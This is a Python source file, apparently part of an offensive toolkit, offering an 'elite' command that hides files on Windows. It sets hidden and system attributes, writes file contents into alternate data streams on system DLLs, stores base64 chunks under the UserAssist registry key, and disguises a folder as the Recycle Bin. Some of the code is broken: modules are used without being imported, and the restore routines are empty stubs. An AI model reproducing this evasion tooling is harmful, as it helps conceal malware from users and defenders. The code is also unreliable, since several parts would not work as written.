#!/usr/bin/env python3
"""
Elite Hide File Command - Advanced file hiding using multiple techniques
Uses NTFS ADS, attributes, and rootkit-style hiding
"""

import os
import sys
import ctypes
import shutil
import base64
from ctypes import wintypes

def elite_hidefile(filepath, method="all"):
    """
    Hide file using advanced techniques:
    - Standard hidden/system attributes
    - NTFS Alternate Data Streams (ADS)
    - Registry storage
    - Directory junction hiding
    """
    
    if not os.path.exists(filepath):
        return {
            "success": False,
            "error": f"File not found: {filepath}",
            "methods": []
        }
    
    try:
        applied_methods = []
        
        if method == "all" or method == "attributes":
            if _hide_with_attributes(filepath):
                applied_methods.append("Hidden/System Attributes")
        
        if method == "all" or method == "ads":
            if _hide_with_ads(filepath):
                applied_methods.append("Alternate Data Stream")
        
        if method == "all" or method == "registry":
            if _hide_in_registry(filepath):
                applied_methods.append("Registry Storage")
        
        if method == "all" or method == "junction":
            if _hide_with_junction(filepath):
                applied_methods.append("Directory Junction")
        
        return {
            "success": len(applied_methods) > 0,
            "filepath": filepath,
            "methods_applied": applied_methods,
            "method_count": len(applied_methods)
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "filepath": filepath,
            "methods": []
        }

def _hide_with_attributes(filepath):
    """Hide file using standard Windows attributes"""
    if os.name != 'nt':
        return False
    
    try:
        kernel32 = ctypes.windll.kernel32
        
        # Set hidden + system attributes
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        
        success = kernel32.SetFileAttributesW(
            filepath,
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
        )
        
        return success != 0
    
    except Exception as e:
        print(f"Attribute hiding failed: {e}")
        return False

def _hide_with_ads(filepath):
    """Hide file in NTFS Alternate Data Stream"""
    if os.name != 'nt':
        return False
    
    try:
        # Choose a legitimate system file to host the ADS
        host_files = [
            r"C:\Windows\System32\kernel32.dll",
            r"C:\Windows\System32\ntdll.dll",
            r"C:\Windows\System32\user32.dll"
        ]
        
        host_file = None
        for candidate in host_files:
            if os.path.exists(candidate):
                host_file = candidate
                break
        
        if not host_file:
            return False
        
        # Create ADS name
        original_name = os.path.basename(filepath)
        ads_name = f"{host_file}:hidden_{original_name}"
        
        # Copy file to ADS
        with open(filepath, 'rb') as src:
            file_data = src.read()
        
        with open(ads_name, 'wb') as dst:
            dst.write(file_data)
        
        # Store metadata in registry for later retrieval
        _store_ads_metadata(filepath, ads_name)
        
        return True
    
    except Exception as e:
        print(f"ADS hiding failed: {e}")
        return False

def _hide_in_registry(filepath):
    """Hide file data in registry"""
    if os.name != 'nt':
        return False
    
    try:
        import winreg
        
        # Read file data
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        # Encode as base64
        encoded_data = base64.b64encode(file_data).decode()
        
        # Store in registry (split if too large)
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # Split data into chunks if needed (registry values have size limits)
        chunk_size = 16000  # Safe size for registry values
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        # Store metadata
        metadata = {
            "original_path": filepath,
            "original_size": len(file_data),
            "chunks": len(chunks),
            "timestamp": time.time()
        }
        
        winreg.SetValueEx(key, "HiddenFileMetadata", 0, winreg.REG_SZ, 
                         base64.b64encode(json.dumps(metadata).encode()).decode())
        
        # Store chunks
        for i, chunk in enumerate(chunks):
            value_name = f"HiddenFileData_{i:04d}"
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, chunk)
        
        winreg.CloseKey(key)
        
        return True
    
    except Exception as e:
        print(f"Registry hiding failed: {e}")
        return False

def _hide_with_junction(filepath):
    """Hide file using directory junction technique"""
    if os.name != 'nt':
        return False
    
    try:
        # Create a directory junction that appears empty but contains our file
        junction_dir = filepath + "_junction"
        
        if os.path.exists(junction_dir):
            return False
        
        # Create directory
        os.makedirs(junction_dir)
        
        # Copy file into junction
        hidden_path = os.path.join(junction_dir, "data")
        shutil.copy2(filepath, hidden_path)
        
        # Set junction attributes to make it look like system folder
        kernel32 = ctypes.windll.kernel32
        
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        FILE_ATTRIBUTE_DIRECTORY = 0x10
        
        kernel32.SetFileAttributesW(
            junction_dir,
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_DIRECTORY
        )
        
        # Create desktop.ini to make it look like system folder
        desktop_ini = os.path.join(junction_dir, "desktop.ini")
        with open(desktop_ini, 'w') as f:
            f.write("[.ShellClassInfo]\n")
            f.write("CLSID={645FF040-5081-101B-9F08-00AA002F954E}\n")
            f.write("LocalizedResourceName=@%SystemRoot%\\system32\\shell32.dll,-8964\n")
        
        # Hide desktop.ini
        kernel32.SetFileAttributesW(desktop_ini, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
        
        return True
    
    except Exception as e:
        print(f"Junction hiding failed: {e}")
        return False

def _store_ads_metadata(original_path, ads_path):
    """Store ADS metadata for later retrieval"""
    try:
        import winreg
        import json
        
        metadata = {
            "original_path": original_path,
            "ads_path": ads_path,
            "timestamp": time.time()
        }
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                              r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced")
        
        value_name = f"HiddenADS_{hash(original_path) & 0xFFFFFFFF:08X}"
        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, 
                         base64.b64encode(json.dumps(metadata).encode()).decode())
        
        winreg.CloseKey(key)
        
    except Exception as e:
        print(f"ADS metadata storage failed: {e}")

def elite_unhidefile(filepath):
    """Unhide file by reversing hiding methods"""
    try:
        restored_methods = []
        
        # Restore attributes
        if _restore_attributes(filepath):
            restored_methods.append("Attributes Restored")
        
        # Restore from ADS
        if _restore_from_ads(filepath):
            restored_methods.append("Restored from ADS")
        
        # Restore from registry
        if _restore_from_registry(filepath):
            restored_methods.append("Restored from Registry")
        
        # Restore from junction
        if _restore_from_junction(filepath):
            restored_methods.append("Restored from Junction")
        
        return {
            "success": len(restored_methods) > 0,
            "filepath": filepath,
            "methods_restored": restored_methods,
            "restoration_count": len(restored_methods)
        }
    
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "filepath": filepath,
            "methods": []
        }

def _restore_attributes(filepath):
    """Restore normal file attributes"""
    if os.name != 'nt':
        return False
    
    try:
        if os.path.exists(filepath):
            kernel32 = ctypes.windll.kernel32
            
            FILE_ATTRIBUTE_NORMAL = 0x80
            success = kernel32.SetFileAttributesW(filepath, FILE_ATTRIBUTE_NORMAL)
            
            return success != 0
    
    except Exception as e:
        print(f"Attribute restoration failed: {e}")
    
    return False

def _restore_from_ads(filepath):
    """Restore file from ADS"""
    # This would search for ADS metadata and restore the file
    # Implementation would check registry for stored ADS paths
    return False

def _restore_from_registry(filepath):
    """Restore file from registry storage"""
    # This would search registry for stored file data
    # Implementation would reconstruct file from registry chunks
    return False

def _restore_from_junction(filepath):
    """Restore file from junction hiding"""
    try:
        junction_dir = filepath + "_junction"
        hidden_path = os.path.join(junction_dir, "data")
        
        if os.path.exists(hidden_path):
            # Copy file back
            shutil.copy2(hidden_path, filepath)
            
            # Remove junction directory
            shutil.rmtree(junction_dir)
            
            return True
    
    except Exception as e:
        print(f"Junction restoration failed: {e}")
    
    return False

if __name__ == "__main__":
    # Test the elite hidefile command
    print("Testing Elite Hide File Command...")
    
    # Create test file
    test_file = "test_hide_file.txt"
    test_content = "This is a test file to be hidden using elite techniques."
    
    with open(test_file, 'w') as f:
        f.write(test_content)
    
    print(f"Created test file: {test_file}")
    
    try:
        # Test hiding
        print(f"\n1. Hiding file using all methods...")
        result = elite_hidefile(test_file, "all")
        
        if result["success"]:
            print(f"✓ File hiding successful!")
            print(f"  Methods applied: {result['method_count']}")
            for method in result['methods_applied']:
                print(f"    - {method}")
            
            # Check if file is still visible normally
            if os.path.exists(test_file):
                print("  File still exists (expected for some methods)")
            else:
                print("  File no longer visible")
        else:
            print(f"✗ File hiding failed: {result['error']}")
        
        # Test unhiding
        print(f"\n2. Unhiding file...")
        result = elite_unhidefile(test_file)
        
        if result["success"]:
            print(f"✓ File unhiding successful!")
            print(f"  Methods restored: {result['restoration_count']}")
            for method in result['methods_restored']:
                print(f"    - {method}")
        else:
            print(f"✗ File unhiding failed: {result.get('error', 'Unknown error')}")
        
        # Verify file content
        if os.path.exists(test_file):
            with open(test_file, 'r') as f:
                content = f.read()
            
            if content == test_content:
                print("✓ File content intact after hide/unhide")
            else:
                print("✗ File content corrupted")
        
    finally:
        # Clean up
        try:
            os.remove(test_file)
        except:
            pass